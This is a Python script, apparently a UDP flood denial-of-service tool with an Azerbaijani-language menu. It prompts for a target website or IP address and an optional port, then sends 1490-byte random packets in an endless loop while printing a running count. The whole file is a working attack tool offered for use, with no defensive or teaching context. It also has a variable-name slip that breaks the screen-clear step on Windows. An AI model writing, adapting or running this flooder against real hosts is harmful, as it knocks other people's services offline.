from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
version = "1.2"
uname=system()
if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
while True:
    print("""\
 (`-')  _   (`-')    _          _(`-')    _(`-')               (`-').-> 
 (OO ).-/   ( OO).->(_)        ( (OO ).->( (OO ).->     .->    ( OO)_   
 / ,---.  ,(_/----. ,-(`-')     \    .'_  \    .'_ (`-')----. (_)--\_)  
 | \ /`.\ |__,    | | ( OO)     '`'-..__) '`'-..__)( OO).-.  '/    _ /  
 '-'|_.' | (_/   /  |  |  )     |  |  ' | |  |  ' |( _) | |  |\_..`--.  
(|  .-.  | .'  .'_ (|  |_/      |  |  / : |  |  / : \|  |)|  |.-._)   \ 
 |  | |  ||       | |  |'->     |  '-'  / |  '-'  /  '  '-'  '\       / 
 `--' `--'`-------' `--'        `------'  `------'    `-----'  `-----'  

                                           \033[96mAuthor : \033[95mMrEquin
                                           \033[96mGithub : \033[95mhttps://github.com/MrEquinOfficial

\033[92m
        {1} Sayt domaininə hücum et!
        {2} IP Ünvana hücum et!
        {3} Çıxış et.
""")
    opt = str(input("Seçimi yaz > "))
    if opt == '1':
        domain = str(input("Sayt : "))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("IP Ünvan : "))
        break

    elif opt == '3':
        print('\n\033[31;1mÇıxış Edilir...\033[0m')
        exit()

    else:
        print('\033[91mSeçim Məlum Deyil!\033[0m')
        time.sleep(2)
        os.system(cmd_clear)
port_mode = False
port = 2

while 1:
    port_bool = str(input("Müəyyən port [h/y]: "))

    if (port_bool == "h") or (port_bool == "H"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "y") or (port_bool == "Y"):
        break

    else:
        print('\033[91mSeçim məlum deyil!\033[0m')
        time.sleep(2)
os.system(cmd_clear)
print('\033[36;2mYOXLANIR....')
time.sleep(1)
print('HÜCUM BAŞLAYIR....')
time.sleep(4)

sent = 0

if port_mode == False:
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1m%s Qədər paket %s -ə göndərildi. Port : %s"%(sent, ip, port))
    except:
        print('\n\033[31;1mÇıxış Edilir...\033[0m')

elif port_mode == True:
    if port < 2:
        port = 2
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')
